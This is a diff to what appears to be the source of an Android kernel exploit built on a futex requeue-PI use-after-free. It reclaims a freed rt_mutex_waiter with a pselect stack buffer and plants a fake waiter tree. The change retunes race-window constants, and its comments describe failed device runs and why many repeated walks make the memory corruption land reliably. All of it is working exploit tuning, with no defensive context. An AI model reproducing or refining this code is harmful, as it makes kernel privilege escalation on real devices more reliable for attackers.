@@ -142,7 +142,14 @@
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_CORE (CORE + 1)
-#define CONSUMER_MAX_CALLS 1
+/* Many walks per pselect window (was 1). The overlay is only live while the
+ * waiter is blocked inside do_select, and Android timer slack makes a single
+ * timed shot land wherever it likes -- device run #2 put it exactly on the
+ * window boundary. Repeated walks are safe: the first one that reaches
+ * rt_mutex_dequeue does the store and rb_link_node then NULLs tree.rb_left, so
+ * later walks only shuffle the fake tree. */
+#define CONSUMER_MAX_CALLS 200
+#define PSELECT_CONSUMER_GAP_USEC 20000
 /* MUST keep the pselect fdset ON THE KERNEL STACK so it aliases (reclaims) the
  * freed rt_mutex_waiter that task->pi_blocked_on dangles at after CMP_REQUEUE_PI.
  * core_sys_select uses stack_fds[256] and heap-allocates when 6*FDS_BYTES(nfds) > 256.
@@ -153,14 +160,15 @@
  * original working value and the largest nfds that still fits on the select stack. */
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
-#define PSELECT_CONSUMER_BURST_CALLS 1
+#define PSELECT_CONSUMER_BURST_CALLS 200
 #define PSELECT_ENTER_DELAY_USEC 50000
 #define PSELECT_TIMEOUT_SEC 5
-/* One pselect() slice. The route re-enters pselect back-to-back for
- * PSELECT_TIMEOUT_SEC total so the fake-waiter overlay is installed
- * ~continuously and the consumer's walk cannot miss the window (device run 1:
- * the walk fired 1ms after a single 5s window had already closed). */
-#define PSELECT_SLICE_MSEC 100
+/* One pselect() slice. Must be MUCH longer than Android's timer slack (which
+ * stretched a 3ms usleep to ~100ms on device run #2 and landed the single walk
+ * exactly on a 100ms slice boundary, outside the overlay window). 1s slices with
+ * the consumer firing every 20ms give ~50 walks per window, and re-entering on
+ * an early return keeps the overlay installed for the whole budget. */
+#define PSELECT_SLICE_MSEC 1000
 #define PSELECT_WRITE_SHAPE_DEFAULT 1
 #define ROUTE_WAIT_SECONDS 8
 #define EARLY_PIPE_PREPARE 0
@@ -390,6 +398,7 @@ long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
 long sched_setattr_tid(int tid, int nice_value);
+long sched_setattr_tid_policy(int tid, int policy, int nice_value);
 int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
